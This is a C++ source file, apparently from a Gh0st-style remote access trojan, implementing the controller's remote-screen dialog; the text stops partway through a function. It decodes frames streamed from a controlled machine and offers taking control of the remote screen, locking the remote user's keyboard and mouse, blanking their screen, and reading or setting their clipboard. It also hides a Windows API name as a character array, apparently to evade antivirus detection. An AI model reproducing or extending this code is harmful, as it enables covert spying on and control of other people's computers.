// ScreenSpy.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ScreenSpyDlg.h"
#include <IMM.H>
#pragma comment(lib, "Imm32.lib")
#include "../common/xvidsdk/XvidDec.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
CXvidDec m_XvidDec;

/////////////////////////////////////////////////////////////////////////////
// CScreenSpy dialog

enum
{
	IDM_CONTROL = 0x0010,	// 控制屏幕
	IDM_TOPMOST,			// 屏幕窗口置顶
	IDM_CTRL_ALT_DEL,		// 发送Ctrl+Alt+Del
	IDM_TRACE_CURSOR,		// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,		// 锁定远程计算机输入
	IDM_BLANK_SCREEN,		// 黑屏
	IDM_CAPTURE_LAYER,		// 捕捉层
	IDM_SAVEDIB,			// 保存图片
	IDM_GET_CLIPBOARD,		// 获取剪贴板
	IDM_SET_CLIPBOARD,		// 设置剪贴板
	IDM_AERO_DISABLE,		// 禁用桌面合成(Aero)
	IDM_AERO_ENABLE,		// 启用桌面合成(Aero)
	IDM_ALGORITHM_HOME,		// 家用办公算法
	IDM_ALGORITHM_XVID,		// 影视娱乐算法
// 	IDM_DEEP_1,				// 屏幕色彩深度.....
// 	IDM_DEEP_4_GRAY,
// 	IDM_DEEP_4_COLOR,
// 	IDM_DEEP_8_GRAY,
// 	IDM_DEEP_8_COLOR,
	IDM_DEEP_16,
	IDM_DEEP_32
};

// 两种算法
#define ALGORITHM_HOME	1	// 家用办公算法
#define ALGORITHM_XVID	2	// 影视娱乐算法

#ifndef SPI_GETWINARRANGING
#define SPI_GETWINARRANGING 0x0082
#endif
#ifndef SPI_SETWINARRANGING
#define SPI_SETWINARRANGING 0x0083
#endif
#ifndef SPI_GETSNAPSIZING
#define SPI_GETSNAPSIZING   0x008E
#endif
#ifndef SPI_SETSNAPSIZING
#define SPI_SETSNAPSIZING   0x008F
#endif

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CScreenSpyDlg::IDD, pParent)
{
//	OutputDebugString("CScreenSpy");
	//{{AFX_DATA_INIT(CScreenSpy)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	typedef UINT (WINAPI *GetSystemDirectoryAT)
		(
		__out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
		__in UINT uSize
		);
	char nBhku[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),nBhku);
	
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_bIsFirst		= true; // 如果是第一次打开对话框，显示提示等待信息
	m_lpvLastBits	= NULL;
	
	char szIconFileName[MAX_PATH];
	pGetSystemDirectoryA(szIconFileName, MAX_PATH);
	lstrcat(szIconFileName, _T("\\shell32.dll"));
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szIconFileName, 17/*网上邻居图标索引*/);
	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	UINT	nBitmapInfoSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi_full = (BITMAPINFO *) new BYTE[nBitmapInfoSize];
	m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBitmapInfoSize];
	
	memcpy(m_lpbmi_full, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBitmapInfoSize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBitmapInfoSize);
	memset(&m_rcRestore, 0, sizeof(m_rcRestore));
	
	m_bIsCtrl = false;    // 默认不进行控制
	m_nFramesPerSecond = 0;
	m_nFramesCount = 0;
	m_LastCursorIndex = 1;
	m_bIsFullScreen = false;
	
	InitializeCriticalSection(&m_cs);
	m_XvidDec.Open(m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, m_lpbmi_full->bmiHeader.biBitCount);
	m_hThreadFPS = CreateThread(NULL, 0, ShowFPSThread, this, 0, NULL);
}

void CScreenSpyDlg::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	if (m_hThreadFPS)
	{
		TerminateThread(m_hThreadFPS, 0);
		CloseHandle(m_hThreadFPS);
	}
	m_XvidDec.Close();
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	
	::ReleaseDC(m_hWnd, m_hCurrWndDC);
	::DeleteDC(m_hLastMemDC);
	::DeleteObject(m_hLastBitmap);
	DeleteCriticalSection(&m_cs);
	
	if (m_lpvRectBits)
		delete[] m_lpvRectBits;
	if (m_lpbmi_rect)
		delete[] m_lpbmi_rect;
	if (m_lpbmi_full)
		delete[] m_lpbmi_full;
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));
	
	m_bIsCtrl = false;
	ClipCursor(NULL);
	DestroyWindow();
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CScreenSpy)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	//{{AFX_MSG_MAP(CScreenSpy)
	ON_WM_NCLBUTTONDBLCLK()
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_MESSAGE(WM_SIZING, OnSizing)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
	ON_WM_GETMINMAXINFO()
	ON_MESSAGE(WM_MOVING, OnMoving)
	ON_WM_MOVE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CScreenSpy message handlers

void CScreenSpyDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN:
		DrawFirstScreen();
		break;
	case TOKEN_NEXTSCREEN:
		// 计算帧率(FPS)
		++m_nFramesCount;
		if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_HOME)
			DrawNextScreenHome();
		else
			DrawNextScreenXvid();
		break;
	case TOKEN_BITMAPINFO:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT:
		UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	default:
		// 传输发生异常数据
		return;
	}
}

bool CScreenSpyDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if(dlg.DoModal () != IDOK)
		return false;
	
	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi_full;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return false;
	}
	
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	
	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpvLastBits, lpbi->bmiHeader.biSizeImage);
	file.Close();
	
	return true;
}

DWORD WINAPI CScreenSpyDlg::ShowFPSThread(LPVOID lpParam)
{
	CScreenSpyDlg *pThis = (CScreenSpyDlg *)lpParam;
	if (pThis->m_pContext == NULL)
		return -1;
	
	while (TRUE)
	{
		CString str; Sleep(1000);
		str.Format(_T("\\\\%s (%d * %d) FPS-%d %d%%"), pThis->m_IPAddress, pThis->m_lpbmi_full->bmiHeader.biWidth, 
			pThis->m_lpbmi_full->bmiHeader.biHeight, pThis->m_nFramesPerSecond, pThis->m_pContext->m_nTransferProgress);
		pThis->SetWindowText(str);
		pThis->m_nFramesPerSecond = pThis->m_nFramesCount;
		pThis->m_nFramesCount = 0;
	}
	return 0;
}

void CScreenSpyDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	
	CString str; DWORD_PTR dwResult;
	str.Format(_T("\\\\%s (%d * %d) FPS-%d %d%%"), m_IPAddress, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight,
		m_nFramesPerSecond, m_pContext->m_nTransferProgress);
	SendMessageTimeout(GetSafeHwnd(), WM_SETTEXT, NULL, (LPARAM)str.GetBuffer(0), SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
}

void CScreenSpyDlg::SendResetScreen(int	nBitCount)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_SCREEN_RESET;
	bBuff[1] = nBitCount;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

void CScreenSpyDlg::SendResetAlgorithm(UINT nAlgorithm)
{
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_ALGORITHM_RESET;
	bBuff[1] = nAlgorithm;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}

BOOL CScreenSpyDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// Set the icon for this dialog.  The framework does this automatically
	// when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TOPMOST, "屏幕窗口置顶(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CTRL_ALT_DEL, "发送Ctrl+Alt+Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪服务端鼠标(&F)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定服务端鼠标和键盘(&O)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "服务端黑屏(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "捕捉层(导致鼠标闪烁)(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&G)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&P)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_DISABLE, "禁用桌面合成(&D)");
		pSysMenu->AppendMenu(MF_STRING, IDM_AERO_ENABLE, "启用桌面合成(&E)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_HOME, "家用办公算法(&H)");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_XVID, "影视娱乐算法(&X)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING|MF_GRAYED, IDM_DEEP_16, "16位增强颜色(&U)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32位真彩颜色(&R)");
		
		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_HOME, IDM_ALGORITHM_XVID, IDM_ALGORITHM_HOME, MF_BYCOMMAND);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_16, IDM_DEEP_32, IDM_DEEP_32, MF_BYCOMMAND);
	}
	
	// TODO: Add extra initialization here
	CString str;
	str.Format(_T("\\\\%s (%d * %d)"), m_IPAddress, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
	SetWindowText(str);
	
	ImmAssociateContext(m_hWnd, NULL);
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
	
	m_LastCursorPos.x = 0;
	m_LastCursorPos.y = 0;
	m_bIsTraceCursor = false;
	
	// 初始化窗口大小结构
	m_hCurrWndDC	= ::GetDC(m_hWnd);
	m_hLastMemDC	= ::CreateCompatibleDC(m_hCurrWndDC);
	m_hLastBitmap	= ::CreateDIBSection(m_hCurrWndDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvLastBits, NULL, NULL);
	m_lpvRectBits	= new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
	SelectObject(m_hLastMemDC, m_hLastBitmap);

	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CScreenSpyDlg::FullScreen()
{	
	LONG style = ::GetWindowLong(this->m_hWnd, GWL_STYLE);
	
	if(!m_bIsFullScreen) //全屏显示
	{
		APPBARDATA abd;
		memset(&abd, 0, sizeof(abd));
		abd.cbSize = sizeof(abd);
		int nMaxWindowWidth, nMaxWindowHeight;
		UINT_PTR uState = SHAppBarMessage(ABM_GETSTATE, &abd);
		SHAppBarMessage(ABM_GETTASKBARPOS, &abd);
		if (abd.uEdge == 0) // 任务栏在左
		{
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
		}
		if (abd.uEdge == 1) // 任务栏在上
		{
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom);
		}
		if (abd.uEdge == 2) // 任务栏在右
		{
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right - abd.rc.left);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
		}
		if (abd.uEdge == 3) // 任务栏在下
		{
			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom - abd.rc.top);
		}
		
		RECT rectWindow, rectClient;
		GetWindowRect(&rectWindow);
		GetClientRect(&rectClient);
		ClientToScreen(&rectClient);
		
		int	nBorderSize = rectClient.left - rectWindow.left; // 单边框的大小(宽度或高度)
		int	nTitleHeight = rectClient.top - rectWindow.top - nBorderSize; // 标题栏的高度
		int nMaxClientWidth = nMaxWindowWidth - nBorderSize * 2;
		int nMaxClientHeight = nMaxWindowHeight - nTitleHeight - nBorderSize * 2;
		
		if (nMaxClientWidth >= m_lpbmi_full->bmiHeader.biWidth && nMaxClientHeight >= m_lpbmi_full->bmiHeader.biHeight)
		{
			OnNcLButtonDblClk(HTCAPTION, NULL);
			return;
		}
		
		GetWindowRect(&m_rcRestore);
		style &= ~(WS_DLGFRAME | WS_THICKFRAME);
		SetWindowLong(this->m_hWnd, GWL_STYLE, style);
		
		if (m_lpbmi_full->bmiHeader.biWidth < GetSystemMetrics(SM_CXSCREEN) &&
			m_lpbmi_full->bmiHeader.biHeight < GetSystemMetrics(SM_CYSCREEN))
		{
			MoveWindow(
				(GetSystemMetrics(SM_CXSCREEN) - m_lpbmi_full->bmiHeader.biWidth)  / 2,
				(GetSystemMetrics(SM_CYSCREEN) - m_lpbmi_full->bmiHeader.biHeight) / 2,
				m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight);
		}
		else if (m_lpbmi_full->bmiHeader.biWidth < GetSystemMetrics(SM_CXSCREEN))
		{
			MoveWindow((GetSystemMetrics(SM_CXSCREEN) - m_lpbmi_full->bmiHeader.biWidth)  / 2, 0,
				m_lpbmi_full->bmiHeader.biWidth, GetSystemMetrics(SM_CYSCREEN));
		}
		else if (m_lpbmi_full->bmiHeader.biHeight < GetSystemMetrics(SM_CYSCREEN))
		{
			MoveWindow(0, (GetSystemMetrics(SM_CYSCREEN) - m_lpbmi_full->bmiHeader.biHeight) / 2,
				GetSystemMetrics(SM_CXSCREEN), m_lpbmi_full->bmiHeader.biHeight);
		}
		else
		{
			MoveWindow(0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
		}
		
		m_bIsFullScreen = true;  // 设置全屏显示标志
		SendMessage(WM_ACTIVATE, MAKEWPARAM(WA_ACTIVE, FALSE), NULL);
	}
	else // 窗口显示
	{
		style |= WS_DLGFRAME | WS_THICKFRAME;
		SetWindowLong(this->m_hWnd, GWL_STYLE, style);
		OnNcLButtonDblClk(HTCAPTION, NULL);
		CMenu* pSysMenu = GetSystemMenu(FALSE);
		if (!(pSysMenu->GetMenuState(IDM_TOPMOST, MF_BYCOMMAND) & MF_CHECKED))
		{
			SendMessage(WM_ACTIVATE, MAKEWPARAM(WA_INACTIVE, FALSE), NULL);
		}
		m_bIsFullScreen = false; // 取消全屏显示标志
	}
}

void CScreenSpyDlg::ResetScreen()
{
	UINT	nBitmapInfoSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi_full != NULL)
	{
		int	nOldWidth = m_lpbmi_full->bmiHeader.biWidth;
		int	nOldHeight = m_lpbmi_full->bmiHeader.biHeight;
		
		delete[] m_lpbmi_full;
		delete[] m_lpbmi_rect;
		m_lpbmi_full = (BITMAPINFO *) new BYTE[nBitmapInfoSize];
		m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBitmapInfoSize];
		memcpy(m_lpbmi_full, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBitmapInfoSize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBitmapInfoSize);
		
		DeleteObject(m_hLastBitmap);
		m_hLastBitmap = CreateDIBSection(m_hCurrWndDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvLastBits, NULL, NULL);
		if (m_lpvRectBits)
		{
			delete[] m_lpvRectBits;
			m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
		}
		SelectObject(m_hLastMemDC, m_hLastBitmap);
		
		m_XvidDec.Close();
		m_XvidDec.Open(m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, m_lpbmi_full->bmiHeader.biBitCount);
		
		// 分辨率发生改变
 		if (nOldWidth != m_lpbmi_full->bmiHeader.biWidth || nOldHeight != m_lpbmi_full->bmiHeader.biHeight)
 		{
			if (m_bIsFullScreen)
			{
				FullScreen();
				FullScreen();
			}
			else
			{
				memset(&m_rcRestore, 0, sizeof(m_rcRestore));
				OnNcLButtonDblClk(HTCAPTION, NULL);
				memset(&m_rcRestore, 0, sizeof(m_rcRestore));
			}
			if (GetKeyState(VK_SCROLL) & 0x0001)
			{
				CRect ClientRect;
				GetClientRect(ClientRect);
				ClientToScreen(ClientRect);
				ClipCursor(ClientRect);
			}
 		}
	}
}

void CScreenSpyDlg::DrawFirstScreen()
{
	bool	bIsReDraw = false;
	BYTE	algorithm = m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];
	LPVOID	lpFirstScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(2);
	DWORD	dwFirstLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 2;
	
	if (algorithm == ALGORITHM_HOME && dwFirstLength > 0)
	{
		if (JPG_BMP(m_lpbmi_full->bmiHeader.biBitCount, lpFirstScreen, dwFirstLength, m_lpvLastBits))
			bIsReDraw = true;
	}
	else if (algorithm == ALGORITHM_XVID && dwFirstLength > 0)
	{
		if (m_XvidDec.Decode(lpFirstScreen, dwFirstLength, m_lpvLastBits) > 0)
			bIsReDraw = true;
	}
	m_bIsFirst = false;
	
	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}

void CScreenSpyDlg::DrawNextScreenHome()
{
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识[1] + 算法[1] + 光标位置[8] + 光标类型索引[1]
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwNextLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
	DWORD	dwNextOffset = 0;
	
	// 判断鼠标是否移动
	LPPOINT	lpNextCursorPos = (LPPOINT)m_pContext->m_DeCompressionBuffer.GetBuffer(2);
	if (memcmp(lpNextCursorPos, &m_LastCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
	{
		bIsReDraw = true;
		memcpy(&m_LastCursorPos, lpNextCursorPos, sizeof(POINT));
	}
	
	// 光标类型发生变化
	LPBYTE lpNextCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10);
	if (*lpNextCursorIndex != m_LastCursorIndex)
	{
		m_LastCursorIndex = *lpNextCursorIndex;
		if (m_bIsTraceCursor)
			bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
		{
			HCURSOR hNewCursor = m_CursorInfo.getCursorHandle(m_LastCursorIndex == (BYTE)-1 ? 1 : m_LastCursorIndex);
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)hNewCursor);
		}
	}
	
	// 屏幕数据是否变化
	while (dwNextOffset < dwNextLength)
	{
		int *pinlen = (int *)((LPBYTE)lpNextScreen + dwNextOffset);
		
		if (JPG_BMP(m_lpbmi_full->bmiHeader.biBitCount, pinlen + 1, *pinlen, m_lpvRectBits))
		{
			bIsReDraw = true;
			LPRECT lpChangedRect = (LPRECT)((LPBYTE)(pinlen + 1) + *pinlen);
			int nChangedRectWidth = lpChangedRect->right - lpChangedRect->left;
			int nChangedRectHeight = lpChangedRect->bottom - lpChangedRect->top;
			
			m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
			m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
			m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
				* nChangedRectHeight;
			
			EnterCriticalSection(&m_cs);
			StretchDIBits(m_hLastMemDC, lpChangedRect->left, lpChangedRect->top, nChangedRectWidth, nChangedRectHeight,
				0, 0, nChangedRectWidth, nChangedRectHeight, m_lpvRectBits, m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);
			LeaveCriticalSection(&m_cs);
			
			dwNextOffset += sizeof(int) + *pinlen + sizeof(RECT);
		}
	}
	
	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}

bool CScreenSpyDlg::JPG_BMP(int cbit, void *input, int inlen, void *output)
{
	struct jpeg_decompress_struct jds;
	struct jpeg_error_mgr jem;
	
	// 设置错误处理
	jds.err = jpeg_std_error(&jem);
	// 创建解压结构
	jpeg_create_decompress(&jds);
	// 设置读取(输入)位置
	jpeg_mem_src(&jds, (byte *)input, inlen);
	// 读取头部信息
	if (jpeg_read_header(&jds, true) != JPEG_HEADER_OK)
	{
		jpeg_destroy_decompress(&jds);
		return false;
	}
	// 设置相关参数
	switch (cbit)
	{
	case 16:
		jds.out_color_space = JCS_EXT_RGB;
		break;
	case 24:
		jds.out_color_space = JCS_EXT_BGR;
		break;
	case 32:
		jds.out_color_space = JCS_EXT_BGRA;
		break;
	default:
		jpeg_destroy_decompress(&jds);
		return false;
	}
	// 开始解压图像
	if (!jpeg_start_decompress(&jds))
	{
		jpeg_destroy_decompress(&jds);
		return false;
	}
	int line_stride = (jds.output_width * cbit / 8 + 3) / 4 * 4;
	while (jds.output_scanline < jds.output_height)
	{
		byte* pline = (byte*)output + jds.output_scanline * line_stride;
		jpeg_read_scanlines(&jds, &pline, 1);
	}
	// 完成图像解压
	if (!jpeg_finish_decompress(&jds))
	{
		jpeg_destroy_decompress(&jds);
		return false;
	}
	// 释放相关资源
	jpeg_destroy_decompress(&jds);
	
	return true;
}

void CScreenSpyDlg::DrawNextScreenXvid()
{
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识[1] + 算法[1] + 光标位置[8] + 光标类型索引[1]
	LPVOID	lpLastScreen = m_lpvLastBits;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwNextLength = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
	
	// 判断鼠标是否移动
	LPPOINT	lpNextCursorPos = (LPPOINT)m_pContext->m_DeCompressionBuffer.GetBuffer(2);
	if (memcmp(lpNextCursorPos, &m_LastCursorPos, sizeof(POINT)) != 0 && m_bIsTraceCursor)
	{
		bIsReDraw = true;
		memcpy(&m_LastCursorPos, lpNextCursorPos, sizeof(POINT));
	}
	
	// 光标类型发生变化
	LPBYTE lpNextCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10);
	if (*lpNextCursorIndex != m_LastCursorIndex)
	{
		m_LastCursorIndex = *lpNextCursorIndex;
		if (m_bIsTraceCursor)
			bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
		{
			HCURSOR hNewCursor = m_CursorInfo.getCursorHandle(m_LastCursorIndex == (BYTE)-1 ? 1 : m_LastCursorIndex);
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)hNewCursor);
		}
	}
	
	// 屏幕数据是否变化
	if (dwNextLength > 0)
	{
		bIsReDraw = true;
		m_XvidDec.Decode(lpNextScreen, dwNextLength, lpLastScreen);
	}
	
	if (bIsReDraw)
	{
#ifdef _DEBUG
		SendNotifyMessage(WM_PAINT, NULL, NULL);
#else
		OnPaint();
#endif // _DEBUG
	}
}

void CScreenSpyDlg::OnPaint() 
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting
	RECT rect;
	GetClientRect(&rect);
	
	if (m_bIsFirst)
	{
		DrawTipString(_T("Please wait - initial screen loading"));
		return;
	}
	
 	//int iHScrollPos = GetScrollPos(SB_HORZ);
 	//int iVScrollPos = GetScrollPos(SB_VERT);
	EnterCriticalSection(&m_cs);
	 //	BitBlt(m_hCurrWndDC, 0, 0, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, m_hLastMemDC, 0, 0, SRCCOPY);
	SetStretchBltMode(m_hCurrWndDC,STRETCH_HALFTONE); 
	LPBITMAPINFO		lpbi = m_lpbmi_full;
	StretchDIBits
		(

		m_hCurrWndDC,
		0, 0, rect.right, rect.bottom, 
		0, 0, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, 
		(LPBYTE)m_lpvLastBits, 
		lpbi, 
		DIB_RGB_COLORS, 
		SRCCOPY
		);
	
	
	LeaveCriticalSection(&m_cs);
	
	// (BYTE)-1 = 255;
	// Draw the cursor
	if (m_bIsTraceCursor)
	{
		DrawIconEx(
			m_hCurrWndDC,								// handle to device context
			0,			// x-coord of upper left corner
			0,			// y-coord of upper left corner
			m_CursorInfo.getCursorHandle(m_LastCursorIndex == (BYTE)-1 ? 1 : m_LastCursorIndex),	// handle to icon to draw
			0,0,										// width of the icon
			0,											// index of frame in animated cursor
			NULL,										// handle to background brush
			DI_NORMAL | DI_COMPAT						// icon-drawing flags
			);
	}

	// Do not call CDialog::OnPaint() for painting messages
}

LRESULT CScreenSpyDlg::OnSizing(WPARAM wParam, LPARAM lParam)
{
	if (m_rcRestore.right && m_rcRestore.bottom)
		memset(&m_rcRestore, 0, sizeof(m_rcRestore));
	return FALSE;
}

void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy) 
{
	//CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (!GetSafeHwnd())
		return;
	
	SCROLLINFO si;
	memset(&si, 0, sizeof(si));
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_PAGE|SIF_RANGE;
	si.nPage = 1;
	si.nMin = 0;
	
	SCROLLBARINFO sbiv, sbih;
	sbiv.cbSize = sizeof(SCROLLBARINFO);
	sbih.cbSize = sizeof(SCROLLBARINFO);
	GetScrollBarInfo(m_hWnd, OBJID_VSCROLL, &sbiv);
	GetScrollBarInfo(m_hWnd, OBJID_HSCROLL, &sbih);
